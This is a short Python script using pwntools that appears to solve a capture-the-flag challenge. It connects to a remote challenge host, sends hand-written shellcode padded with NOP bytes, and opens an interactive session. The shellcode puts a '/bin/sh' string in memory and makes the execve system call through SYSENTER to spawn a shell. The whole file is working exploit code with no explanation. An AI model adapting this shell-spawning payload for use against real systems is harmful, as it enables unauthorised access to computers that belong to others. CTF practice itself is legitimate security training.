from pwn import *

# context.log_level = 'debug'
context.arch = 'amd64'

# p = process('./chal')
p = remote('chal.amt.rs', 1341)

pay = asm('''
          xor rsp, rsp
          xor rbp, rbp
          mov esp, 0x1337200
          mov ebp, 0x1337200

          xor ebx, ebx
          xor ecx, ecx
          xor edx, edx
          mov ebx, 0x1337100

          xor rax, rax
          xor rsi, rsi
          xor rdx, rdx
          mov ax, 0x0b
          SYSENTER
''')

print(hex(len(pay)))
pay += b'\x90'*(0x100-len(pay))
pay += p64(0x68732F6E69622F)
pay += b'\x90'*(0x1000-len(pay))
print(hex(len(pay)))
print(pay.hex())

p.sendafter(b'>',pay)

p.interactive()
